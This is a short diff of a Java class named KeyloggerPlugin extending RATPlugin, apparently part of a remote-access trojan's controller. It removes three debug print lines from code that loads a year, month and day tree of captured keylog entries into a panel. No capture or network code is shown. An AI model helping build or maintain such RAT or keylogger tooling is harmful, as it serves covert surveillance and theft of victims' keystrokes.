@@ -85,20 +85,17 @@ public class KeyloggerPlugin extends RATPlugin {
 			for (int i = 0; i < years; i++) {
 				DefaultMutableTreeNode year = new DefaultMutableTreeNode(dis.readUTF());
 				panel.getRoot().insert(year, 0);
-				System.out.println(year.toString());
 				
 				int months = dis.readInt();
 				
 				for (int l = 0; l < months; l++) {
 					DefaultMutableTreeNode month = new DefaultMutableTreeNode(dis.readUTF());
-					System.out.println(month.toString());
 
 					year.insert(month, 0);
 					
 					int days = dis.readInt();
 					for (int m = 0; m < days; m++) {
 						DefaultMutableTreeNode day = new DefaultMutableTreeNode(dis.readUTF());
-						System.out.println(day.toString());
 
 						month.insert(day, 0);
 					}
